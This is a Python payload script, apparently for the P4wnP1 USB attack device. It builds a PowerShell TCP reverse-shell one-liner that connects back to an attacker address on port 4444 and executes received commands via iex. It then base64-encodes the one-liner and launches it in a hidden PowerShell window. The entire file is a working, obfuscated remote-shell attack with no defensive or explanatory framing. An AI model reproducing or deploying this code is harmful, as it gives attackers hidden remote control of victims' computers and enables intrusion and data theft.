# File: /opt/p4wnp1/payloads/reverse_shell.py
import subprocess
import base64
import os
import socket

# === Detect local IP bound to USB gadget ===
def get_usb_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("10.255.255.255", 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "10.13.37.1"

ip = get_usb_ip()
port = 4444

print(f"[*] Launching in-memory reverse shell to {ip}:{port}")

# === PowerShell TCP shell one-liner ===
ps1 = f'''$c=New-Object Net.Sockets.TCPClient(\"{ip}\",{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$s.Write(([text.encoding]::ASCII).GetBytes($sb2),0,$sb2.Length)}};$c.Close()'''

encoded = base64.b64encode(ps1.encode("utf-16le")).decode()

try:
    subprocess.run([
        "powershell", "-NoLogo", "-NonInteractive", "-WindowStyle", "Hidden",
        "-EncodedCommand", encoded
    ])
except Exception as e:
    print(f"[!] Reverse shell failed: {e}")
